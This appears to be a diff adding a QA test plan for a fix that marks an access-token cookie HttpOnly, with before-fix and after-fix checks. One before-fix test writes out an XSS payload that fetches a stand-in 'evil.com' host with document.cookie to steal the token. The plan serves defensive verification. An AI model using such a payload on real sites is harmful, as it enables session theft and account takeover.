@@ -1,0 +1,61 @@
+After Fix
+Test Case 1: Check Cookie Set with HttpOnly
+Purpose: Ensure that the access token cookie is set with the HttpOnly flag.
+Steps:
+1.	Call the /login endpoint with valid credentials.
+2.	Inspect the Set-Cookie header in the response.
+3.	Verify that HttpOnly is present in the cookie attributes.
+Expected Result:
+Set-Cookie: access_token_cookie=...; HttpOnly; ...
+
+Test Case 2: Attempt to Read Cookie with JavaScript
+Purpose: Verify that the access token cookie is not accessible from client-side JavaScript.
+Steps:
+1.	Login to the application.
+2.	Open browser console and run:
+3.	console.log(document.cookie);
+4.	Check the output for access_token_cookie.
+Expected Result:
+•	The access_token_cookie should not appear in the output.
+
+ Test Case 3: Refresh Token Sets HttpOnly Cookie
+Purpose: Ensure that /refresh also sets the access token cookie with HttpOnly.
+Steps:
+1.	Login and obtain a valid refresh token.
+2.	Call /refresh with the refresh token.
+3.	Check response headers for Set-Cookie.
+Expected Result:
+Set-Cookie: access_token_cookie=...; HttpOnly; ...
+
+Test Cases Before Fix
+
+Test Case 1: Check Cookie Set Without HttpOnly
+Purpose: Confirm that the access token cookie is being set without the HttpOnly flag.
+Steps:
+1.	Call the /login endpoint with valid credentials.
+2.	Inspect the Set-Cookie header in the response.
+Expected Result (Vulnerable):
+Set-Cookie: access_token_cookie=...; path=/; domain=...;  // ❌ Missing HttpOnly
+
+Test Case 2: Access Cookie via JavaScript
+Purpose: Validate that the access token is accessible from client-side scripts.
+Steps:
+1.	Login to the application.
+2.	Open browser DevTools console.
+3.	Run:
+4.	console.log(document.cookie);
+Expected Result (Vulnerable):
+access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6...
+
+ Test Case 3: Simulate XSS-Based Cookie Theft
+Purpose: Emulate a basic XSS attack to steal the access token.
+Steps:
+1.	Inject a simple payload into a vulnerable field (e.g., comment box or URL):
+2.	<script>
+3.	fetch("http://evil.com/steal?cookie=" + document.cookie);
+4.	</script>
+5.	Login as a victim and trigger the payload.
+Expected Result (Vulnerable):
+•	Attacker receives:
+•	access_token_cookie=eyJ... (full token)
+
